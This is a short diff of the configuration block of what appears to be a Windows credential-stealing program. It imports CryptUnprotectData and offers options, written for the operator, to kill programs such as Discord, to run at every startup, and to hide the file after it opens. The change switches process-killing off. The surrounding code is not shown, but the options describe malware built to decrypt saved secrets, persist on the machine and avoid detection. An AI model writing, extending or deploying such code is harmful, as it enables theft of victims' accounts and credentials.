@@ -36,7 +36,7 @@ from win32crypt import CryptUnprotectData
 
 config = {
     # Set to False if you don't want it to kill programs such as discord upon running the exe.
-    'kill_processes': True,
+    'kill_processes': False,
     # This makes the program run the file after every startup.
     'startup': True,
     # This feature will make the file hide itself after opened.
